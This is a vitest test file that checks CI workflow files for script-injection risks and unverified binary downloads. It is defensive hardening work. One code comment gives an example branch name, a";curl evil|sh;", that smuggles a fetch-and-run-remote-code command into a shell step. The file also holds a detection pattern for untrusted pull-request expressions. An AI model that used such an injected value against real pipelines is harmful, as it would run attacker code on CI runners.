import { describe, expect, it } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';

const repoRoot = path.resolve(import.meta.dirname, '../../..');
const WORKFLOW_DIRS = ['.github/workflows', '.forgejo/workflows'];

/** Expressions a pull-request author or branch name controls. */
const UNTRUSTED = /\$\{\{[^}]*github\.(head_ref|event\.(pull_request\.(title|body|head\.ref|head\.label)|issue\.(title|body)|comment\.body|review\.body|head_commit\.message|workflow_run\.head_branch))[^}]*\}\}/;

function workflows(): Array<{ file: string; lines: string[] }> {
  return WORKFLOW_DIRS.flatMap((dir) => {
    const abs = path.join(repoRoot, dir);
    if (!fs.existsSync(abs)) return [];
    return fs.readdirSync(abs)
      .filter((name) => /\.ya?ml$/.test(name))
      .map((name) => ({ file: `${dir}/${name}`, lines: fs.readFileSync(path.join(abs, name), 'utf8').split('\n') }));
  });
}

describe('CI workflow hardening', () => {
  it('reads every workflow in both forges', () => {
    const files = workflows().map((w) => w.file);
    expect(files).toContain('.github/workflows/pr-review.yml');
    expect(files).toContain('.forgejo/workflows/mirror.yml');
  });

  it('passes untrusted pull-request text to shell steps only through env', () => {
    // Allowed: "  KEY: ${{ ... }}" (an env or with: value). Refused: the
    // expression inside a shell line, where a branch name like
    // a";curl evil|sh;" becomes code on the runner.
    const offenders = workflows().flatMap(({ file, lines }) =>
      lines
        .map((line, i) => ({ line, n: i + 1 }))
        .filter(({ line }) => UNTRUSTED.test(line) && !/^\s*-?\s*[\w-]+:\s*\$\{\{/.test(line))
        .map(({ n }) => `${file}:${n}`));
    expect(offenders).toEqual([]);
  });

  it('verifies a sha256 for every release binary a workflow downloads', () => {
    const unpinned = workflows().flatMap(({ file, lines }) =>
      lines.flatMap((line, i) => {
        if (!/releases\/download\//.test(line)) return [];
        const window = lines.slice(Math.max(0, i - 8), i + 8).join('\n');
        const pinned = /[0-9a-f]{64}/.test(window) && /sha256sum (-c|--check)/.test(window);
        return pinned ? [] : [`${file}:${i + 1}`];
      }));
    expect(unpinned).toEqual([]);
  });

  it('flags the injection shape it is meant to catch', () => {
    const bad = '          echo "Branch: ${{ github.head_ref }}"';
    const good = '          PR_HEAD_REF: ${{ github.head_ref }}';
    expect([UNTRUSTED.test(bad), /^\s*-?\s*[\w-]+:\s*\$\{\{/.test(bad)]).toEqual([true, false]);
    expect([UNTRUSTED.test(good), /^\s*-?\s*[\w-]+:\s*\$\{\{/.test(good)]).toEqual([true, true]);
  });
});
